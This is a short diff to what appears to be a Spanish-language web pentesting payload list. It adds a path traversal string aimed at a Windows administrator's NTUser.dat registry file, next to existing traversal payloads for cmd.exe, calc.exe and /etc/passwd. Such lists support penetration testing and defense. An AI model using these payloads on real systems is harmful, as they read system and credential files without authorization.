@@ -34,6 +34,7 @@ Introducir directorios inexistentes ../../../etc/otro/../passwd o ../../../etc/.
 ../../../../../../../../../../../windows/system32/SysWOW64/calc.exe
 ../../../../../../../../../../../windows/system32/cmd.exe
 ../../../../../../../../../../../windows/system32/SysWOW64/cmd.exe
+../../../../../../../../../../../Users/Administrator/NTUser.dat
 
 #XMLRPC
 drupalxml.xml =>
